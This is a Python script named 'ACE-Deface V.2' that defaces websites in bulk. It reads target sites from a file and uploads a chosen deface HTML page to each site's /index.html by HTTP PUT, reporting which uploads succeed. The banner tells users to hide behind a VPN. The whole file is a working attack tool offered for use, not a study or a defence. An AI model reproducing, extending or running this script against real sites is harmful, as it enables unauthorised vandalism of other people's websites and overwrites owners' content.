#-*- coding: utf-8 -*-
try:
   import os
   import sys
   import time
   import random
   import os.path
   import requests
   import threading
except ImportError:
   exit("install requests and try again ...(pip install requests")
os.system("git pull")
os.system("clear")
red    = "\033[31m"
blue   = "\033[34m"
bold   = "\033[1m"
reset  = "\033[0m"
green  = "\033[32m"
yellow = "\033[33m"
colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]
color1, color2, color3, color4, color5 = random.sample(colors, 5)
banner = f"""

             ＿＿
　　　　 　 / ＞　　フ   
 　　　　　| 　_　 _ l   Author : Disease (CPScript)
　 　　 　／` ミ＿xノ    Date   : 8-18-2023
　　 　 /　　　 　 |     Tools  : ACE-Deface V.2
　　　 /　 ヽ　　 ﾉ      Note   : Please use VPN!
　 　 │　　|　|　|
　／￣|　　 |　|　|
　| (￣ヽ＿ヽ)__)
　 ＼二つ



"""+reset+blue
def animate():
    text = "Uploading script to websites..."
    while True:
        for i in range(len(text)):
            print(text[:i] + "_" + text[i+1:], end="\r")
            time.sleep(0.1)
def eagle(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)   
   return str(ipt)
def ace(script, target_file="targets.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print(" ")
        print(green+bold+"[✓]\033[0m \033[34mUploading script to %d website...." % (len(target)), end="", flush=True)
        print(" ")
	# start the animation thread
        t = threading.Thread(target=animate)
        t.daemon = True 
        t.start()                
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/index.html", data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(red + "[" + bold + " FAILED!\033[0m     " + red + " ] %s/%s" % (site, script))
                else:
                    print(green + "[" + bold + " SUCCESS!\033[0m" + green + " ] %s/%s" % (site, script))
            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()
def main(__bn__):
   print(__bn__)
   while True:
      try:
         print(green+'[Please put the deface script/ .html file in this same folder and type it\'s name below]'+reset+blue)
         print(' ')
         a = eagle(green+"[+]\033[0m \033[34mEnter your deface script \033[33m[Type index.html for built in script]\033[0m \033[34m> ")
         if not os.path.isfile(a):
            print(' ')
            print(red+bold+"	file '%s' not found in this folder !"%(a))
            print(" ")
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()
   ace(a)
if __name__ == "__main__":
    main(banner)
